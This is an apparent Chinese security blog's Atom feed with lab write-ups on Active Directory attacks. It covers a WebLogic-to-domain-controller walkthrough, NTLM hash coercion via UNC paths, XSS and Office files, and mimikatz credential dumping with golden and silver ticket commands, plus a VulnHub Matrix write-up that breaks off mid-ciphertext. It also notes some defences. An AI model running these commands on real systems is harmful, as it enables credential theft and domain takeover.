<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>bak6ry</title>
  
  <subtitle>welcome to taste bread</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-07T16:10:23.637Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>bak6ry</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>域渗透靶机二</title>
    <link href="http://yoursite.com/2020/03/14/%E9%9D%B6%E6%9C%BA%E4%BA%8C/"/>
    <id>http://yoursite.com/2020/03/14/靶机二/</id>
    <published>2020-03-14T04:26:00.000Z</published>
    <updated>2020-04-07T16:10:23.637Z</updated>
    
    <content type="html"><![CDATA[<h2 id="开启weblogic服务"><a href="#开启weblogic服务" class="headerlink" title="开启weblogic服务"></a>开启weblogic服务</h2><p><img src="/靶机二/1585649664377.png" alt="Alt text"></p><p>CVE-2019-2725<br><img src="/靶机二/1585649776410.png" alt="Alt text"></p><p>上传shell</p><p><img src="/靶机二/1585651007126.png" alt="Alt text"></p><p><img src="/靶机二/1585652479473.png" alt="Alt text"></p><p>冰蝎反弹shell</p><p><img src="/靶机二/1585652616028.png" alt="Alt text"></p><p>nslookup -type=SRV _ldap._tcp.corp</p><p>定位域控</p><p><img src="/靶机二/1585652672612.png" alt="Alt text"></p><p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p><p>mimikatz.exe “sekurlsa::minidump lsass.dmp” “sekurlsa::logonPasswords full”</p><p><img src="/靶机二/1586096250544.png" alt="Alt text"></p><h1 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h1><p>C:/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/</p><p><img src="/靶机二/1586096999313.png" alt="Alt text"></p><p>python2 reGeorgSocksProxy.py -p 8080 -u <a href="http://192.168.111.80:7001/_async/tunnel.jsp" target="_blank" rel="noopener">http://192.168.111.80:7001/_async/tunnel.jsp</a></p><p><img src="/靶机二/1586096995119.png" alt="Alt text"></p><p>3389</p><h2 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h2><p><img src="/靶机二/1586098773702.png" alt="Alt text"></p><h2 id="ptt"><a href="#ptt" class="headerlink" title="ptt"></a>ptt</h2><p><img src="/靶机二/1586097976918.png" alt="Alt text"></p><p>S-1-5-21-2756371121-2868759905-3853650604-1001</p><p>proxychains python ms14-068.py -u <a href="mailto:de1ay@de1ay.com" target="_blank" rel="noopener">de1ay@de1ay.com</a> -s S-1-5-21-2756371121-2868759905-3853650604-1001 -d 10.10.10.10 -p ‘1qaz@WSX’</p><p><img src="/靶机二/1586098136389.png" alt="Alt text"><br>2.使用 pykek 生成票据，用 proxychains 把 pykek 带入内网</p><h2 id="smb中继"><a href="#smb中继" class="headerlink" title="smb中继"></a>smb中继</h2><p><img src="/靶机二/1586108619104.png" alt="Alt text"></p><p>wen机执行<br>dir \10.10.10.10\c$</p><h2 id="防御，启动签名"><a href="#防御，启动签名" class="headerlink" title="防御，启动签名"></a>防御，启动签名</h2><p>requiresecuritysignature</p><p><img src="/靶机二/1586103122442.png" alt="Alt text"></p><h2 id="域控沦陷"><a href="#域控沦陷" class="headerlink" title="域控沦陷"></a>域控沦陷</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;开启weblogic服务&quot;&gt;&lt;a href=&quot;#开启weblogic服务&quot; class=&quot;headerlink&quot; title=&quot;开启weblogic服务&quot;&gt;&lt;/a&gt;开启weblogic服务&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/靶机二/1585649664377.p
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>ntlm请求发起</title>
    <link href="http://yoursite.com/2020/03/10/ntlm%E8%AF%B7%E6%B1%82%E5%8F%91%E8%B5%B7/"/>
    <id>http://yoursite.com/2020/03/10/ntlm请求发起/</id>
    <published>2020-03-10T02:26:00.000Z</published>
    <updated>2020-04-07T15:59:33.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ntlm请求发起"><a href="#ntlm请求发起" class="headerlink" title="ntlm请求发起"></a>ntlm请求发起</h1><h2 id="deskto-ini"><a href="#deskto-ini" class="headerlink" title="deskto.ini"></a>deskto.ini</h2><p>文件夹底下都有个文件desktop.ini来指定文件夹图标之类的</p><p>将图标路径改成UNC路径，指向我们的服务器</p><p>当用户访问该文件夹的时候会去访问UNC路径,我们就能获取用户的net-ntlm hash。</p><h2 id="scf-文件"><a href="#scf-文件" class="headerlink" title="scf 文件"></a>scf 文件</h2><p>只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的。以下是scf后缀的文件的格式</p><p>新建test.scf，写入内容，放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash。</p><h2 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h2><p>适用于Windows 10/2016/2019</p><p>用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问172.16.100.180，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个可以用来提权。后面会详细讲。</p><h2 id="系统命令携带UNC路径"><a href="#系统命令携带UNC路径" class="headerlink" title="系统命令携带UNC路径"></a>系统命令携带UNC路径</h2><p> dir \ip\xxx<br><img src="/ntlm请求发起/1585241548654.png" alt="Alt text"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><script src="\\172.16.100.1\xss">这种情况适用于IE和edge，其他浏览器不允许从http域跨到file域，以chrome为例把payload 改成<script src="//172.16.100.1/x">看到跳出认证框，我们也没抓到net-ntlm hash不像smb请求直接用当然用户名和密码去登录，发起http请求时，除非该站点的域名位于企业内部网或存在于可信站点列表中。否则都会跳出认证框来让操作者再输入一次。当我们选择自动使用当前用户名和密码登录就能拿到用户的net-ntlm hash![Alt text](/ntlm请求发起/1585241664041.png)### 如果有xss，那构造的页面的效果有两种smb网络文件协议1、构造unc，访问smb 协议，但是这种方式的话就只有IE和edge能行<script src="\\172.16.100.1\xss">2、构造http，访问http 协议，这种方式并不限制浏览器访问，但是除非该站点的域名位于企业内部网或存在于可信站点列表中，不然是不会使用系统默认的凭据进行登录的，会跳出认证框，让用户填写账号密码<script src="//172.16.100.1\xss">3、第二点该站点的域名位于企业内部网也是行的，那如果我们可以修改控制域内的DNS是不是就可以动点手脚了。在查看DNS的ACL的时候，我发现了一条规则![Alt text](/ntlm请求发起/1585241802868.png)也就意味着如果我们是域内认证 用户的话，那我们就可以在域内添加域名。我们使用在kerberos篇里面提到过的Powermad里面的Invoke-DNSUpdate添加一条DNS记然后将我们的payload 换成<script  src="//xss\xss"></script><p>由于此时的域名位于企业内部网，所以当用户触发xss的时候会以当前用户去认证，我们也就能拿到用户的net-ntlm hash</p><p>###outlook<br>发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC。于是我们构造payload<br><img src="\\172.16.100.1\outlook"></p><h3 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h3><p>PDF规范允许为GoTobe和GoToR条目加载远程内容。PDF文件可以添加一项功能，请求远程SMB服务器的文件。我们直接使用三好学生的脚本<a href="https://github.com/3gstudent/Worse-PDF" target="_blank" rel="noopener">https://github.com/3gstudent/Worse-PDF</a></p><h3 id="office"><a href="#office" class="headerlink" title="office"></a>office</h3><p>首先新建一个word，贴近一张图片</p><p>然后用7zip 打开(没测试其他软件，可自行测试)</p><p>进入word_rels，修改document.xml.rels</p><p>可以看到Target参数本来是本地的路径</p><p>修改为UNC路径，然后加上TargetMode=”External”<br><img src="/ntlm请求发起/1585242092917.png" alt="Alt text"></p><p>当打开word的时候,我们就拿到net-ntlm hash</p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>需要具备loadfile权限，且没有securefile_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)</p><p>LOAD_FILE是支持UNC路劲</p><p>select load_file(‘\\172.16.100.1\mysql’);</p><h3 id="NBNS和LLMNR"><a href="#NBNS和LLMNR" class="headerlink" title="NBNS和LLMNR"></a>NBNS和LLMNR</h3><p>解析域名的顺序是</p><pre><code>HostsDNS (cache / server)LLMNRNBNS</code></pre><h4 id="LLMNR-进行名称解析的过程为："><a href="#LLMNR-进行名称解析的过程为：" class="headerlink" title="LLMNR 进行名称解析的过程为："></a>LLMNR 进行名称解析的过程为：</h4><pre><code>检查本地 NetBIOS 缓存如果缓存中没有则会像当前子网域发送广播当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败</code></pre><p>而是采用广播包的形式，去询问DNS，跟ARP很像，那跟ARP投毒一样的一个安全问题就会出现</p><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><p>当受害者访问一个不存在的域名的时候。比如 hhhhhhhhhhhhhhhhhhhh</p><p>这个时候hhhhhhhhhhhhhhhhhhhh映射的ip就是攻击者的IP，当受害者访问<br>hhhhhhhhhhhhhhhhhhhh就会访问攻击者的IP，攻击者就能拿到net-ntlm hash</p><h4 id="NBNS"><a href="#NBNS" class="headerlink" title="NBNS"></a>NBNS</h4><p>NetBIOS Name Service。</p><p>检查本地 NetBIOS 缓存<br>如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求<br>如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播<br>如果发送广播后无任何主机响应则会读取本地的 lmhosts </p><p>lmhosts 文件位于C:\Windows\System32\drivers\etc\目录中。</p><p>NetBIOS 协议进行名称解析是发送的 UDP 广播包。因此在没有配置 WINS 服务器的情况底下，LLMNR协议存在的安全问题，在NBNS协议里面同时存在</p><h4 id="WPAD和mitm6"><a href="#WPAD和mitm6" class="headerlink" title="WPAD和mitm6"></a>WPAD和mitm6</h4><p>Web Proxy Auto-Discovery Protocol </p><p>定位代理配置文件PAC(在下文也叫做PAC文件或者wpad.dat)，下载编译并运行，最终自动使用代理访问网络</p><p>默认自动检测设置是开启的</p><p><img src="/ntlm请求发起/1585242523725.png" alt="Alt text"><br><img src="/ntlm请求发起/1585242529464.png" alt="Alt text"><br>查询PAC文件的顺序如下：</p><p>1.通过DHCP服务器</p><p>2.查询WPAD主机的IP</p><pre><code>HostsDNS (cache / server)LLMNRNBNS</code></pre><h4 id="配合LLMNR-NBNS投毒"><a href="#配合LLMNR-NBNS投毒" class="headerlink" title="配合LLMNR/NBNS投毒"></a>配合LLMNR/NBNS投毒</h4><h4 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h4><p>Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信</p><p>任何经过身份验证的域成员都可以连接到远程服务器的打印服务</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ntlm请求发起&quot;&gt;&lt;a href=&quot;#ntlm请求发起&quot; class=&quot;headerlink&quot; title=&quot;ntlm请求发起&quot;&gt;&lt;/a&gt;ntlm请求发起&lt;/h1&gt;&lt;h2 id=&quot;deskto-ini&quot;&gt;&lt;a href=&quot;#deskto-ini&quot; class=&quot;
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>各种姿势的hash抓取</title>
    <link href="http://yoursite.com/2020/02/23/%E6%8A%93%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2020/02/23/抓密码/</id>
    <published>2020-02-23T02:49:00.000Z</published>
    <updated>2020-04-07T16:07:38.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="抓密码"><a href="#抓密码" class="headerlink" title="抓密码"></a>抓密码</h1><h2 id="绕杀软"><a href="#绕杀软" class="headerlink" title="绕杀软"></a>绕杀软</h2><p>必须使用管理员权限<br>procdump+mimikatz</p><p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p><p><img src="/抓密码/1584976301130.png" alt="Alt text"></p><p>mimikatz.exe “sekurlsa::minidump lsass.dmp” “sekurlsa::logonPasswords full” exit</p><p><img src="/抓密码/1584976285811.png" alt="Alt text"></p><p>ekurlsa::minidump lsass.dmp</p><p>sekurlsa::logonPasswords full</p><p><img src="/抓密码/1584976491855.png" alt="Alt text"></p><h2 id="win10-win2012-R2用户明文密码"><a href="#win10-win2012-R2用户明文密码" class="headerlink" title="win10/win2012 R2用户明文密码"></a>win10/win2012 R2用户明文密码</h2><p>###抓取明文：<br>手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码</p><p>此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</p><p>锁屏<br> powershell -file lock-screen.ps1</p><p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p><p>使用本地的mimikatz.exe读取lsass.dmp。</p><h2 id="不兼容"><a href="#不兼容" class="headerlink" title="不兼容"></a>不兼容</h2><p>win2012 r2不兼容的时候<br>使用powershell版本的mimikatz</p><p>Invoke-Mimikatz.ps1</p><p>powershell -exec bypass “import-module.Invoke-Mimikatz.ps1;Invoke-Mimikatz”</p><h2 id="wdigest明文密码"><a href="#wdigest明文密码" class="headerlink" title="wdigest明文密码"></a>wdigest明文密码</h2><p>WDigest</p><h3 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h3><p>Windows XP-Windows 8.0 和 Windows Server 2003-Windows Server 2012</p><p>Microsoft 在 Windows8.1，Windows 10，Windows Server 2012 R2 和 Windows Server 2016 系统中默认禁用此协议</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>Negotiate 和 UseLogonCredential 注册表项值应设置为 0 可以完全禁用此协议</p><p>Microsoft 已发布了一个补丁（KB2871997），允许管理员启用或禁用 WDigest 协议。打完补丁后，建议验证是否已经从注册表中禁用 WDigest</p><h2 id="lsa交互"><a href="#lsa交互" class="headerlink" title="lsa交互"></a>lsa交互</h2><p> Windows Server 2012R2 和Windows 8.1 之前的系统，攻击者可以执行 Mimikatz 命令来与 LSA 交互并检索存储在 LSA 内存中的明文密码</p><p>sekurlsa::logonPasswords</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA<br>创建注册表项 RunAsPPL 并设置其值为 1</p><h2 id="凭证缓存"><a href="#凭证缓存" class="headerlink" title="凭证缓存"></a>凭证缓存</h2><p>如果域控制器不可用，Windows 将检查已缓存的最后一个密码哈希值，以便使用系统对用户进行身份验证</p><p>HKEY_LOCAL_MACHINE\SECURITY\Cache</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p> 如果执行 Mimikatz 以下命令，可以检索这些哈希值： </p><p>lsadump::cache</p><h3 id="受保护的用户组"><a href="#受保护的用户组" class="headerlink" title="受保护的用户组"></a>受保护的用户组</h3><p>WindowsServer 2012 及更高版本中的 Microsoft 引入了一个名为「Protected Users」的新安全组</p><p>此组使域管理员能够保护本地管理员等有权限的用户</p><p>属于该组的任何帐户只能通过 Kerberos 对域进行身份验证</p><p>防止 NTLS 密码哈希值或 LSAS 中的纯文本凭据泄露给敏感帐户</p><p> PowerShell 命令将帐户添加到「受保护的用户」组中<br>Add-ADGroupMember –Identity ‘Protected Users’ –Members Jane</p><p>通过安装 Microsoft 的补丁 KB2871997，WindowsServer 2008 等较旧的操作系统可以拥有此安全组。</p><h2 id="抓krbtgt的hash"><a href="#抓krbtgt的hash" class="headerlink" title="抓krbtgt的hash"></a>抓krbtgt的hash</h2><p>域控上执行<br>lsadump::lsa /patch </p><p>31834030dc700e7fb1f0955fa21836a6</p><p>mimikatz log “lsadump::dcsync /domain:test.com /user:krbtgt”<img src="/抓密码/1585041991458.png" alt="Alt text"></p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>sid   whoami /all<br> S-1-5-21-3617263104-3895675313-3447860874-500<br>31834030dc700e7fb1f0955fa21836a6</p><h4 id="使用krbtgt的hash值"><a href="#使用krbtgt的hash值" class="headerlink" title="使用krbtgt的hash值"></a>使用krbtgt的hash值</h4><p> / user —伪造的用户名<br> / groups（可选）：513,512,520,518,519为默认的管理员组。<br>/ id（可选） - 用户RID。Mimikatz默认值是500（默认管理员帐户RID）。</p><p>企业管理员SID：S-1-5-21 <domainid> -519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）</domainid></p><h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><p>kerberos::golden /admin:Administrator /domain:test.com /sid:S-1-5-21-3617263104-3895675313-3447860874 /krbtgt:31834030dc700e7fb1f0955fa21836a6<br>/id:500 /ticket:1.kirbi</p><p>mimikatz::ptt 1.kirbi<br>或者/ptt<br><img src="/抓密码/1585041556041.png" alt="Alt text"></p><p><img src="/抓密码/1585110382727.png" alt="Alt text"></p><h4 id="使用krbtgt的aes256值"><a href="#使用krbtgt的aes256值" class="headerlink" title="使用krbtgt的aes256值"></a>使用krbtgt的aes256值</h4><p>sekurlsa::ekeys</p><p>好的方法是使用日志记录功能将回显内容输出到文件中，开启日志记录功能后会把输出回显的内容保存在同级目录下的mimikatz.log中，命令参考如下：<br>mimikatz log privilege::debug sekurlsa::ekeys</p><h5 id="keberos认证"><a href="#keberos认证" class="headerlink" title="keberos认证"></a>keberos认证</h5><p><img src="/抓密码/1585102620475.png" alt="Alt text"></p><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>9a163fca485a2f0ceace1b055d047cbe</p><p><img src="/抓密码/1585132411945.png" alt="Alt text"><br>S-1-5-21-3617263104-3895675313-3447860874</p><p>kerberos::golden /admin:administrator /id:2601 /domain:test.com /sid:S-1-5-21-3617263104-3895675313-3447860874  /target:bak6ry-ad2003.test.com /rc4:9a163fca485a2f0ceace1b055d047cbe /service:cifs /ptt </p><p><img src="/抓密码/1585133166092.png" alt="Alt text"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>53b6d8ac02e7fe818f171992169b1750</p><p>SID : S-1-5-21-2952760202-1353902439-2381784089-500<br>domain  GOD.ORG<br>aes256</p><p>Administrator<br>97782e856bfb6d0a5d80d7f9c07a1f12e9ca68dbdfdf057bdccea9857bc3ae70</p><p>kerberos::golden /user:liukaifeng01  /domain:GOD.ORG /sid:S-1-5-21-2952760202-1353902439-2381784089  /target:owa.god.org /rc4:81be2f80d568100549beac645d6a7141 /service:cifs /ptt </p><p><img src="/抓密码/1585186033257.png" alt="Alt text"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;抓密码&quot;&gt;&lt;a href=&quot;#抓密码&quot; class=&quot;headerlink&quot; title=&quot;抓密码&quot;&gt;&lt;/a&gt;抓密码&lt;/h1&gt;&lt;h2 id=&quot;绕杀软&quot;&gt;&lt;a href=&quot;#绕杀软&quot; class=&quot;headerlink&quot; title=&quot;绕杀软&quot;&gt;&lt;/a&gt;绕杀软&lt;/h
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>keberos协议</title>
    <link href="http://yoursite.com/2020/02/12/keberos/"/>
    <id>http://yoursite.com/2020/02/12/keberos/</id>
    <published>2020-02-12T11:24:00.000Z</published>
    <updated>2020-04-07T16:13:35.572Z</updated>
    
    <content type="html"><![CDATA[<h1 id="keberos协议-tgsreq-amp-tgsrep"><a href="#keberos协议-tgsreq-amp-tgsrep" class="headerlink" title="keberos协议 tgsreq&amp;tgsrep"></a>keberos协议 tgsreq&amp;tgsrep</h1><p>1、用户通过AS_REP拿到的TGT票据，去向KDC申请特定服务的访问权限</p><p>2、KDC校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据</p><p>3、用户再拿着TGS去访问特定的服务</p><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><p>访问任何服务</p><p>非约束委派的安全问题就是如果我们找到配置了非约束的委派的账户，比如这里面的JACKSON-PC$，并且通过一定手段拿下该账户的权限，然后诱导域管访问该JACKSON-PC$，这个时候域管会将自己TGT发送到JACKSON-PC$并缓存到LSASS中，那我们就可以从LSASS中导出域管的TGT票据，然后通过PTT，从而拥有域管的权限。</p><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>在 Windows 2003上发布了”约束”委派</p><p>约束委派将限制指定服务器可以代表用户执行的服务</p><p>相较于非约束委派，约束委派最大的区别也就是配置的时候选择某个特定的服务，而不是所有服务。</p><h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h2><p>为了配置受约束的委派，必须拥有SeEnableDelegation特权</p><p>基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用</p><h2 id="基于资源的约束委派和约束委派的区别"><a href="#基于资源的约束委派和约束委派的区别" class="headerlink" title="基于资源的约束委派和约束委派的区别"></a>基于资源的约束委派和约束委派的区别</h2><p>在服务2上 配置服务1 到服务2的基于资源的约束委派(不同于传统的约束委派需要域管的权限才能配置，只有拥有服务2 的权限就可以配置基于资源的约束委派</p><p>服务1 代表用户申请一个获得针对服务1自身的kerberos服务票据(这一步就是S4U2SELF，这一步就区别传统的约束委派<br>服务1并没有配置TrustedToAuthForDelegation位和msDS-AllowedToDelegateTo 字段。因此这一步返回的TGS票据是不可转发的，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的可转发的TGS</p><p>#<br>主要体现为，普通的约束委派的配置需要SeEnableDelegation权限，而这个权限通常仅授予Domain Admins。因此我们对普通的约束委派的利用，往往在于寻找域内已有的约束委派，再利用。但是对于基于资源的约束委派，假如我们已经拥有服务账号1，那么只要我们具备用户2的LDAP权限，这样就可以配置服务1对服务2的约束委派(在服务账户2的用户属性上配置msDS-AllowedToActOnBehalfOfOtherIdentity为1的sid)，服务1就可以控制服务2。</p><h2 id="白银票据局限性"><a href="#白银票据局限性" class="headerlink" title="白银票据局限性"></a>白银票据局限性</h2><p>伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名(关于PAC的详细信息，将在下一篇文章里面详细介绍)，则银票将不起作用</p><h2 id="基于资源的约束委派攻击攻击"><a href="#基于资源的约束委派攻击攻击" class="headerlink" title="基于资源的约束委派攻击攻击"></a>基于资源的约束委派攻击攻击</h2><p>1、我们拥有一个任意的服务账户1 或者计算机账户<br>getsystem</p><p>2、我们获得服务账户2 的LDAP权限<br>3、配置服务1对服务2的约束委派<br>在服务账户2的用户属性上配置msDS-AllowedToActOnBehalfOfOtherIdentity为服务账户1的sid<br>4、发起一个从服务1到服务2的正常的约束委派的流程，从而访问服务2</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;keberos协议-tgsreq-amp-tgsrep&quot;&gt;&lt;a href=&quot;#keberos协议-tgsreq-amp-tgsrep&quot; class=&quot;headerlink&quot; title=&quot;keberos协议 tgsreq&amp;amp;tgsrep&quot;&gt;&lt;/a&gt;keber
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>vulnhub|渗透测试Matrix</title>
    <link href="http://yoursite.com/2019/08/14/Matrix1/"/>
    <id>http://yoursite.com/2019/08/14/Matrix1/</id>
    <published>2019-08-14T11:26:00.000Z</published>
    <updated>2020-04-07T15:59:55.331Z</updated>
    
    <content type="html"><![CDATA[<p>#vulnhub|渗透测试Matrix 1</p><p>##题记</p><p>最近在打靶机，发现了一个挺有意思的靶机，这里想跟大家分享一下.</p><p>##环境准备<br>vulnhub最近出的一台靶机</p><p><a href="https://www.vulnhub.com/entry/matrix-1,259/" target="_blank" rel="noopener">靶机</a><br>Machine_Matrix.zip (Size: 552 MB)</p><p>Download: <a href="https://mega.nz/#!CiwBjRZB!EtKOQvDQjytMq3LkkMgrHDC9EYxEz8mqpOg5M2N1OOk" target="_blank" rel="noopener">https://mega.nz/#!CiwBjRZB!EtKOQvDQjytMq3LkkMgrHDC9EYxEz8mqpOg5M2N1OOk</a></p><p>Download (Mirror): <a href="https://download.vulnhub.com/matrix/Machine_Matrix.zip" target="_blank" rel="noopener">https://download.vulnhub.com/matrix/Machine_Matrix.zip</a></p><p>Download (Torrent): <a href="https://download.vulnhub.com/matrix/Machine_Matrix.zip.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/matrix/Machine_Matrix.zip.torrent</a>     ( Magnet)</p><p>攻击机 Kali IP 10.10.10.129</p><p>靶机在同一C段下 IP 10.10.10.135</p><p>##主机发现</p><p>使用命令<code>nmap -sP 10.10.10.0/24</code></p><p><img src="/2/1.png" alt=""></p><p>起始Ip 10.10.10.1，攻击机的ip是10.10.10.128，而10.10.10.254是结束ip。因为环境配置为dhcp动态分布，所以说我们的靶机ip就是10.10.10.135</p><p>##端口扫描<br>我们需要知道目标机器上开了哪些端口，运行了哪些服务，利用某些服务的漏洞来进行攻击，所以我们先进行端口扫描。</p><p><code>nmap -A -T4 -p- 10.10.10.135</code></p><p><img src="/2/2.png" alt=""></p><p>NMAP输出向我们表明，有4个端口开放：22（SSH），80（HTTP），31337（HTTP）<br>我们发现80端口运行HTTP，所以我们在浏览器中打开</p><p><img src="/2/3.png" alt=""></p><p>ctrl + u 查看源代码</p><p>发现提示assets/img/p0rt_31337.png</p><p><img src="/2/4.png" alt=""><br>暗示了寻找31337端口<br>于是访问<a href="http://10.10.10.135:31337/" target="_blank" rel="noopener">http://10.10.10.135:31337/</a><br><img src="/2/5.png" alt=""><br>查看源代码发现一串base64<br><code>ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=</code></p><p>echo”ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=” | base64 -d</p><p>解码得:<br><img src="/2/6.png" alt=""></p><p>百度翻译一波</p><p><img src="/2/7.png" alt=""></p><p>此句为黑客帝国里的经典语句</p><p>发现重点在后面的Cypher.matrix文件<br>访问之</p><p>下载获得密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ ++++. +++++</span><br><span class="line">+.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++.-</span><br><span class="line">-.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+</span><br><span class="line">+++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +.+++ +++++ +.+++ +++.&lt; +++[- &gt;---&lt; ]&gt;---</span><br><span class="line">---.&lt; +++[- &gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;-.&lt; +++++ +++[-</span><br><span class="line">&gt;++++ ++++&lt; ]&gt;+++ +++++ +.+++ ++.++ ++++. ----- .&lt;+++ +++++ [-&gt;-- -----</span><br><span class="line">-&lt;]&gt;- ----- ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;++</span><br><span 